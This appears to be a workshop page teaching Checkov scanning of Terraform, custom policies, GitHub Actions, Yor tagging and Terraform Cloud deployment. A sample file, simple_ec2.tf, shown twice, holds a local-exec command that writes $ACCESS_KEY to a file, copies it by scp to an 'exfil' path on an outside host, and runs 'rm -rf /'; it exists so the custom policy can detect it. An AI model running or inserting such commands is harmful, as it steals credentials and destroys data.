<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">git</span> <span style="color:#a6e22e">clone</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//github.com/&lt;your-organization&gt;/prisma-cloud-devsecops-workshop.git
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">cd</span> <span style="color:#a6e22e">prisma</span><span style="color:#f92672">-</span><span style="color:#a6e22e">cloud</span><span style="color:#f92672">-</span><span style="color:#a6e22e">devsecops</span><span style="color:#f92672">-</span><span style="color:#a6e22e">workshop</span><span style="color:#f92672">/</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">git</span> <span style="color:#a6e22e">status</span>
</span></span></code></pre></div><p>Great! Now we have some code to scan. Let&rsquo;s jump in&hellip;</p>
<p><strong>2. Scan with <strong>checkov</strong></strong></p>
<ul>
<li>Checkov can be configured to scan files and enforce policies in many different ways. To highlight a few:
<ul>
<li>Scans can run on individual files or entire directories.</li>
<li>Policies can be selected through selection or omission.</li>
<li>Enforcement can be determined by flags that control checkov&rsquo;s exit code.</li>
</ul>
</li>
</ul>
<p>Let&rsquo;s start by scanning the entire <code>./code</code> directory and viewing the results.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">cd</span> <span style="color:#a6e22e">code</span><span style="color:#f92672">/</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">checkov</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span> .
</span></span></code></pre></div>
<div class="expand">
    <div class="expand-label" style="cursor: pointer;" onclick="$h = $(this);$h.next('div').slideToggle(100,function () {$h.children('i').attr('class',function () {return $h.next('div').is(':visible') ? 'fas fa-chevron-down' : 'fas fa-chevron-right';});});">
        <i style="font-size:x-small;" class="fas fa-chevron-right"></i>
        <span>
        
    	
    	Is this learn theme rocks ?
    	
    	</span>
    </div>
    <div class="expand-content" style="display: none;">
        <p><img alt="1" src="/aws-ws/images/1/1.png?featherlight=false&width=90pc"> <img alt="5" src="/aws-ws/images/6/61/5.png?featherlight=false&width=90pc"> ![6][5]</p>

    </div>
</div>
<p><img alt="6" src="/aws-ws/images/6/61/5.png?featherlight=false&width=90pc"></p>
<p>Failed checks are returned containing the offending file and resource, the lines of code that triggered the policy, and a guide to fix the issue.</p>
<p><img alt="6" src="/aws-ws/images/6/61/5-1.png?featherlight=false&width=50pc"></p>
<p>Now try running checkov on an individual file with <code>checkov -f &lt;filename&gt;</code>.</p>

<div class="expand">
    <div class="expand-label" style="cursor: pointer;" onclick="$h = $(this);$h.next('div').slideToggle(100,function () {$h.children('i').attr('class',function () {return $h.next('div').is(':visible') ? 'fas fa-chevron-down' : 'fas fa-chevron-right';});});">
        <i style="font-size:x-small;" class="fas fa-chevron-right"></i>
        <span>
        
    	
    	simple_ec2.tf
    	
    	</span>
    </div>
    <div class="expand-content" style="display: none;">
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>provider <span style="color:#e6db74">&#34;aws&#34;</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  region <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;us-west-2&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>resource <span style="color:#e6db74">&#34;aws_ec2_host&#34;</span> <span style="color:#e6db74">&#34;test&#34;</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  instance_type     <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;t3.micro&#34;</span>
</span></span><span style="display:flex;"><span>  availability_zone <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;us-west-2a&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  provisioner <span style="color:#e6db74">&#34;local-exec&#34;</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;echo Running install scripts.. &#39;echo </span>$ACCESS_KEY<span style="color:#e6db74"> &gt; creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /&#39;   &#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div>
    </div>
</div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>checkov -f deployment_ec2.tf
</span></span><span style="display:flex;"><span>checkov -f simple_ec2.tf
</span></span></code></pre></div><p><img alt="6" src="/aws-ws/images/6/61/5-2.png?featherlight=false&width=50pc"></p>
<p>Policies can be optionally enforced or skipped with the <code>--check</code> and <code>--skip-check</code> flags.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>checkov -f deployment_s3.tf --check CKV_AWS_18,CKV_AWS_52
</span></span><span style="display:flex;"><span>checkov -f deployment_s3.tf --skip-check CKV_AWS_18,CKV_AWS_52
</span></span></code></pre></div><p>Frameworks can also be selected or omitted for a particular scan:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>checkov -d . --framework secrets --enable-secret-scan-all-files
</span></span><span style="display:flex;"><span>checkov -d . --skip-framework dockerfile
</span></span></code></pre></div><p>Lastly, enforcement can be more granularly controlled by using the &ndash;soft-fail option. Applying &ndash;soft-fail results in the scan always returning a 0 exit code. Using &ndash;hard-fail-on overrides this option.</p>
<p>Check the exit code when running checkov -d . with and without the &ndash;soft-fail option.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>checkov -d . ; echo $?
</span></span><span style="display:flex;"><span>checkov -d . --soft-fail ; echo $?
</span></span></code></pre></div><p><strong>3. Custom polices</strong></p>
<p>Checkov supports the creation of Custom Policies  for users to customize their own policy and configuration checks. Custom policies can be written in YAML (recommended) or python and applied with the <code>--external-checks-dir</code> or <code>--external-checks-git</code> flags.</p>
<p>Let&rsquo;s create a custom policy to check for <strong>local-exec and remote-exec Provisioners</strong>  being used in Terraform resource definitons.
<a href="https://developer.hashicorp.com/terraform/language/resources/provisioners/local-exec">https://developer.hashicorp.com/terraform/language/resources/provisioners/local-exec</a></p>

<div class="expand">
    <div class="expand-label" style="cursor: pointer;" onclick="$h = $(this);$h.next('div').slideToggle(100,function () {$h.children('i').attr('class',function () {return $h.next('div').is(':visible') ? 'fas fa-chevron-down' : 'fas fa-chevron-right';});});">
        <i style="font-size:x-small;" class="fas fa-chevron-right"></i>
        <span>
        
    	
    	Expand provisioners code:  check.yaml
    	
    	</span>
    </div>
    <div class="expand-content" style="display: none;">
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>metadata:
</span></span><span style="display:flex;"><span> name: <span style="color:#e6db74">&#34;Terraform contains local-exec and/or remote-exec provisioner&#34;</span>
</span></span><span style="display:flex;"><span> id: <span style="color:#e6db74">&#34;CKV2_TF_1&#34;</span>
</span></span><span style="display:flex;"><span> category: <span style="color:#e6db74">&#34;GENERAL_SECURITY&#34;</span>
</span></span><span style="display:flex;"><span>definition:
</span></span><span style="display:flex;"><span> and:
</span></span><span style="display:flex;"><span>  - cond_type: <span style="color:#e6db74">&#34;attribute&#34;</span>
</span></span><span style="display:flex;"><span>    resource_types: all
</span></span><span style="display:flex;"><span>    attribute: <span style="color:#e6db74">&#34;provisioner/local-exec&#34;</span>
</span></span><span style="display:flex;"><span>    operator: <span style="color:#e6db74">&#34;not_exists&#34;</span>
</span></span><span style="display:flex;"><span>  - cond_type: <span style="color:#e6db74">&#34;attribute&#34;</span>
</span></span><span style="display:flex;"><span>    resource_types: all
</span></span><span style="display:flex;"><span>    attribute: <span style="color:#e6db74">&#34;provisioner/remote-exec&#34;</span>
</span></span><span style="display:flex;"><span>    operator: <span style="color:#e6db74">&#34;not_exists&#34;</span>
</span></span></code></pre></div>
    </div>
</div>
<p>Add the above code to a new file within a new direcotry.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>mkdir custom-checks/
</span></span><span style="display:flex;"><span>vim custom-checks/check.yaml
</span></span></code></pre></div><p><em>[!TIP] use echo &lsquo;$(file_contents)&rsquo; &gt; custom-checks/check.yaml if formatting is an issue with vim.</em></p>
<p>Save the file. Then run checkov with the <strong>&ndash;external-checks-dir</strong> to test the custom policy.</p>

<div class="expand">
    <div class="expand-label" style="cursor: pointer;" onclick="$h = $(this);$h.next('div').slideToggle(100,function () {$h.children('i').attr('class',function () {return $h.next('div').is(':visible') ? 'fas fa-chevron-down' : 'fas fa-chevron-right';});});">
        <i style="font-size:x-small;" class="fas fa-chevron-right"></i>
        <span>
        
    	
    	simple_ec2.tf
    	
    	</span>
    </div>
    <div class="expand-content" style="display: none;">
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>provider <span style="color:#e6db74">&#34;aws&#34;</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  region <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;us-west-2&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>resource <span style="color:#e6db74">&#34;aws_ec2_host&#34;</span> <span style="color:#e6db74">&#34;test&#34;</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  instance_type     <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;t3.micro&#34;</span>
</span></span><span style="display:flex;"><span>  availability_zone <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;us-west-2a&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  provisioner <span style="color:#e6db74">&#34;local-exec&#34;</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;echo Running install scripts.. &#39;echo </span>$ACCESS_KEY<span style="color:#e6db74"> &gt; creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /&#39;   &#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div>
    </div>
</div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>checkov -f simple_ec2.tf --external-checks-dir custom-checks
</span></span></code></pre></div><p><img alt="6" src="/aws-ws/images/6/61/6.png?featherlight=false&width=90pc"></p>
<p><strong>Challenge</strong>: *<em>write a custom policy to check all resources for the presence of tags. Specifically, ensure that a tag named &ldquo;Environment&rdquo; exists.</em></p>
<ol start="4">
<li>IDE plugin:</li>
</ol>
<p>[!NOTE] Demo Only. Requires API key for Prisma Cloud.</p>
<p>Link to docs: <a href="https://docs.prismacloud.io/en/classic/appsec-admin-guide/get-started/connect-your-repositories/integrate-ide/integrate-ide">Prisma Cloud IDE plugins</a></p>
<p>Link to docs: <a href="https://marketplace.visualstudio.com/items?itemName=Bridgecrew.checkov">VScode extension</a></p>
<ul>
<li>Enabling checkov in an IDE provides real-time scan (in Cloud9)</li>
</ul>
<ol start="5">
<li>Github Actions:</li>
</ol>
<ul>
<li>Create a new action from scratch = <strong>checkov.yaml</strong></li>
</ul>

<div class="expand">
    <div class="expand-label" style="cursor: pointer;" onclick="$h = $(this);$h.next('div').slideToggle(100,function () {$h.children('i').attr('class',function () {return $h.next('div').is(':visible') ? 'fas fa-chevron-down' : 'fas fa-chevron-right';});});">
        <i style="font-size:x-small;" class="fas fa-chevron-right"></i>
        <span>
        
    	
    	checkov.yaml
    	
    	</span>
    </div>
    <div class="expand-content" style="display: none;">
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>name: checkov
</span></span><span style="display:flex;"><span>on:
</span></span><span style="display:flex;"><span>  pull_request:
</span></span><span style="display:flex;"><span>  push:
</span></span><span style="display:flex;"><span>    branches:
</span></span><span style="display:flex;"><span>      - main
</span></span><span style="display:flex;"><span>jobs:
</span></span><span style="display:flex;"><span>  scan:
</span></span><span style="display:flex;"><span>    runs-on: ubuntu-latest
</span></span><span style="display:flex;"><span>    permissions:
</span></span><span style="display:flex;"><span>      contents: read <span style="color:#75715e"># for actions/checkout to fetch code</span>
</span></span><span style="display:flex;"><span>      security-events: write <span style="color:#75715e"># for GitHub/codeql-action/upload-sarif to upload SARIF results</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    steps:
</span></span><span style="display:flex;"><span>    - uses: actions/checkout@v2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    - name: Run checkov
</span></span><span style="display:flex;"><span>      id: checkov
</span></span><span style="display:flex;"><span>      uses: bridgecrewio/checkov-action@master
</span></span><span style="display:flex;"><span>      with:
</span></span><span style="display:flex;"><span>        directory: code/
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#soft_fail: true</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#api-key: ${{ secrets.BC_API_KEY }}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">#env:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#PRISMA_API_URL: https://api4.prismacloud.io</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    - name: Upload SARIF file
</span></span><span style="display:flex;"><span>      uses: GitHub/codeql-action/upload-sarif@v2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># Results are generated only on a success or failure</span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># this is required since GitHub by default won&#39;t run the next step</span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># when the previous one has failed. Alternatively, enable soft_fail in checkov action.</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>: success<span style="color:#f92672">()</span> <span style="color:#f92672">||</span> failure<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>      with:
</span></span><span style="display:flex;"><span>        sarif_file: results.sarif
</span></span></code></pre></div>
    </div>
</div>
<p>Notice the policy violations that were seen earlier in CLI/Cloud9 are now displayed here.
<img alt="6" src="/aws-ws/images/6/61/8-1.png?featherlight=false&width=90pc"></p>
<ol start="6">
<li>View results in Github Security</li>
</ol>
<p>Checkov natively supports SARIF format and generates this output by default. GitHub Security accepts SARIF for uploading security issues. The GitHub Action created earlier handles the plumbing between the two.</p>
<p>Navigate to the Security tab in GitHub, the click Code scanning from the left sidebar or View alerts in the <strong>Security overview &gt; Code scanning alerts</strong> section.</p>
<p>The security issues found by checkov are surfaced here for developers to get actionable feedback on the codebase they are working in without having to leave the platform.</p>
<p><img alt="6" src="/aws-ws/images/6/61/8.png?featherlight=false&width=90pc"></p>
<ol>
<li>Tag and Trace with Yor:</li>
</ol>
<p>Yor is another open source tool that can be used for tagging and tracing IaC resources from code to cloud. For example, yor can be used to add git metadata and a unique hash to a terraform resource; this can be used to better manage resource lifecycles, improve change management, and ultimately to help tie code defintions to runtime configurations.</p>
<ul>
<li>Create new file in the GitHub UI under the path <code>.github/workflows/yor.yaml</code>.

<div class="expand">
    <div class="expand-label" style="cursor: pointer;" onclick="$h = $(this);$h.next('div').slideToggle(100,function () {$h.children('i').attr('class',function () {return $h.next('div').is(':visible') ? 'fas fa-chevron-down' : 'fas fa-chevron-right';});});">
        <i style="font-size:x-small;" class="fas fa-chevron-right"></i>
        <span>
        
    	
    	Expand: yor.yaml
    	
    	</span>
    </div>
    <div class="expand-content" style="display: none;">
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>name: IaC tag and trace
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>on:
</span></span><span style="display:flex;"><span>  push:
</span></span><span style="display:flex;"><span>  pull_request:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>jobs:
</span></span><span style="display:flex;"><span>  yor:
</span></span><span style="display:flex;"><span>    runs-on: ubuntu-latest
</span></span><span style="display:flex;"><span>    permissions:
</span></span><span style="display:flex;"><span>      contents: write
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    steps:
</span></span><span style="display:flex;"><span>      - uses: actions/checkout@v2
</span></span><span style="display:flex;"><span>        name: Checkout repo
</span></span><span style="display:flex;"><span>        with:
</span></span><span style="display:flex;"><span>          fetch-depth: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>      - name: Run yor action
</span></span><span style="display:flex;"><span>        uses: bridgecrewio/yor-action@main
</span></span></code></pre></div>
    </div>
</div></li>
<li>Viewing any <code>.tf</code> file in the <code>code/</code> <a href="https://github.com/PaloAltoNetworks/prisma-cloud-devsecops-workshop/tree/main/code">directory</a>.</li>
</ul>
<ol>
<li>Branch Protection Rules:</li>
</ol>
<p>Using Branch Protection Rules allows for criteria to be set in order for pushes and pull requests to be merged to a given branch. This can be set up to run checkov and block merges if there are any misconfigurations or vulnerabilities.</p>
<ul>
<li>Github &gt; Branches &gt; Add branch protection rule.</li>
<li>Enter: <code>main</code></li>
<li>Check: <code>Require status checks to pass before merging</code> search for <code>checkov</code> (scan)</li>
</ul>
<ol start="3">
<li>Integrate workflow with Terraform Cloud</li>
</ol>
<ul>
<li>
<p>Create a new organizaion: some_org</p>
</li>
<li>
<p>Email:</p>
</li>
<li>
<p>Create a New Workspace: VS Workflow</p>
<ul>
<li>Connect to Github &gt; Choose the <strong>prisma-cloud-devsecops-workshop</strong> from the list of repositories.</li>
<li>Add a Workspace:
<ul>
<li>Name: <strong>prisma-cloud-devsecops-workshop</strong></li>
<li>Project: Default Project</li>
<li>Terraform Working Directory: <strong>/code/bulid/</strong></li>
</ul>
</li>
<li>VS Triggers: Only trigger
<ul>
<li>Select Syntax: Patterns</li>
</ul>
</li>
<li>Pull Requests: Check Automatic speculative plans
<ul>
<li>-&gt; Continue to workspace overview</li>
</ul>
</li>
</ul>
</li>
<li>
<p>prisma-cloud-devsecops-workshop: Configure variables</p>
<ul>
<li>Add variables for <code>AWS_SECRET_KEY_ID</code> and <code>AWS_SECRET_ACCESS_KEY</code>.</li>
<li>Ensure you select <code>Environment variables</code> for both and that <code>AWS_SECRET_ACCESS_KEY</code> is marked as <code>Sensitive</code>.</li>
</ul>
</li>
</ul>

<div class="expand">
    <div class="expand-label" style="cursor: pointer;" onclick="$h = $(this);$h.next('div').slideToggle(100,function () {$h.children('i').attr('class',function () {return $h.next('div').is(':visible') ? 'fas fa-chevron-down' : 'fas fa-chevron-right';});});">
        <i style="font-size:x-small;" class="fas fa-chevron-right"></i>
        <span>
        
    	
    	AWS S3 Access
    	
    	</span>
    </div>
    <div class="expand-content" style="display: none;">
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>IAM user: tf-cloud
</span></span><span style="display:flex;"><span>Attach policies: AdministratorAccess
</span></span><span style="display:flex;"><span>Security credentials:
</span></span><span style="display:flex;"><span>  Access key <span style="color:#f92672">(</span>Third-party service<span style="color:#f92672">)</span>
</span></span></code></pre></div>
    </div>
</div>
<p><img alt="6" src="/aws-ws/images/6/61/10.png?featherlight=false&width=90pc"></p>
<ol start="10">
<li>Block a Pull Request, Prevent a Deployment</li>
</ol>
<ul>
<li>We have now configured a GitHub repository to be scanned with checkov and to trigger Terraform Cloud to deploy infrastructure</li>
<li>Create a new file in the GitHub UI under the path code/build/s3.tf

<div class="expand">
    <div class="expand-label" style="cursor: pointer;" onclick="$h = $(this);$h.next('div').slideToggle(100,function () {$h.children('i').attr('class',function () {return $h.next('div').is(':visible') ? 'fas fa-chevron-down' : 'fas fa-chevron-right';});});">
        <i style="font-size:x-small;" class="fas fa-chevron-right"></i>
        <span>
        
    	
    	Expand s3.tf
    	
    	</span>
    </div>
    <div class="expand-content" style="display: none;">
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>provider <span style="color:#e6db74">&#34;aws&#34;</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  region <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;us-west-2&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>resource <span style="color:#e6db74">&#34;aws_s3_bucket&#34;</span> <span style="color:#e6db74">&#34;dev_s3&#34;</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  bucket_prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dev-&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  tags <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    Environment      <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Dev&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>resource <span style="color:#e6db74">&#34;aws_s3_bucket_ownership_controls&#34;</span> <span style="color:#e6db74">&#34;dev_s3&#34;</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  bucket <span style="color:#f92672">=</span> aws_s3_bucket.dev_s3.id
</span></span><span style="display:flex;"><span>  rule <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    object_ownership <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;BucketOwnerPreferred&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div>
    </div>
</div></li>
<li>Once complete, click <code>Commit changes</code>&hellip; at the top right, then select <code>Create a new branch and start a pull reques</code>t and click <code>Propose changes</code>.</li>
<li>At the next screen, review the diff then click <code>Create pull request</code>.</li>
<li>Either bypass branch protections and Merge pull request or go back to the Github Action for checkov and uncomment the line with <code>--soft-fail=true</code>. This will require closing and reopening a new pull request.</li>
</ul>
<p>ISSUE:</p>
<p><img alt="6" src="/aws-ws/images/6/61/18.png?featherlight=false&width=90pc">
<img alt="6" src="/aws-ws/images/6/61/17.png?featherlight=false&width=90pc"></p>
<p>Fix: code/build</p>

<div class="expand">
    <div class="expand-label" style="cursor: pointer;" onclick="$h = $(this);$h.next('div').slideToggle(100,function () {$h.children('i').attr('class',function () {return $h.next('div').is(':visible') ? 'fas fa-chevron-down' : 'fas fa-chevron-right';});});">
        <i style="font-size:x-small;" class="fas fa-chevron-right"></i>
        <span>
        
    	
    	providers.tf
    	
    	</span>
    </div>
    <div class="expand-content" style="display: none;">
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>terraform <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  required_providers <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    aws <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      source  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hashicorp/aws&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>provider <span style="color:#e6db74">&#34;aws&#34;</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  region  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;us-west-2&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div>
    </div>
</div>

<div class="expand">
    <div class="expand-label" style="cursor: pointer;" onclick="$h = $(this);$h.next('div').slideToggle(100,function () {$h.children('i').attr('class',function () {return $h.next('div').is(':visible') ? 'fas fa-chevron-down' : 'fas fa-chevron-right';});});">
        <i style="font-size:x-small;" class="fas fa-chevron-right"></i>
        <span>
        
    	
    	s3.tf change to main.tf
    	
    	</span>
    </div>
    <div class="expand-content" style="display: none;">
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>resource <span style="color:#e6db74">&#34;aws_s3_bucket&#34;</span> <span style="color:#e6db74">&#34;dev_s3&#34;</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  bucket_prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dev-&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  tags <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    Environment          <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Dev&#34;</span>
</span></span><span style="display:flex;"><span>    yor_name             <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dev_s3&#34;</span>
</span></span><span style="display:flex;"><span>    yor_trace            <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;d6c205d2-67e5-4856-a003-e9d4a2629f8d&#34;</span>
</span></span><span style="display:flex;"><span>    git_commit           <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;69a9110e596f86b5250039de52aa332e25b79a36&#34;</span>
</span></span><span style="display:flex;"><span>    git_file             <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;code/build/s3.tf&#34;</span>
</span></span><span style="display:flex;"><span>    git_last_modified_at <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;2024-05-14 10:49:55&#34;</span>
</span></span><span style="display:flex;"><span>    git_last_modified_by <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;150504127+nonotnonez@users.noreply.github.com&#34;</span>
</span></span><span style="display:flex;"><span>    git_modifiers        <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;150504127+nonotnonez&#34;</span>
</span></span><span style="display:flex;"><span>    git_org              <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;nonotnonez&#34;</span>
</span></span><span style="display:flex;"><span>    git_repo             <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;prisma-cloud-devsecops-workshop&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>resource <span style="color:#e6db74">&#34;aws_s3_bucket_ownership_controls&#34;</span> <span style="color:#e6db74">&#34;dev_s3&#34;</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  bucket <span style="color:#f92672">=</span> aws_s3_bucket.dev_s3.id
</span></span><span style="display:flex;"><span>  rule <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    object_ownership <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;BucketOwnerPreferred&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div>
    </div>
</div>
<ol start="11">
<li>Workflow Deploy to AWS</li>
</ol>
<ul>
<li>Update <strong>main.tf</strong> and merge to main repo</li>
</ul>
<p><img alt="6" src="/aws-ws/images/6/61/ex/1.png?featherlight=false&width=90pc">
<img alt="6" src="/aws-ws/images/6/61/ex/2.png?featherlight=false&width=90pc">
<img alt="6" src="/aws-ws/images/6/61/ex/3.png?featherlight=false&width=90pc"></p>
<ul>
<li>Navigate to <strong>Terraform Cloud</strong> and view the running plan.</li>
</ul>
<p><img alt="6" src="/aws-ws/images/6/61/ex/4.png?featherlight=false&width=90pc">
<img alt="6" src="/aws-ws/images/6/61/ex/6.png?featherlight=false&width=90pc">
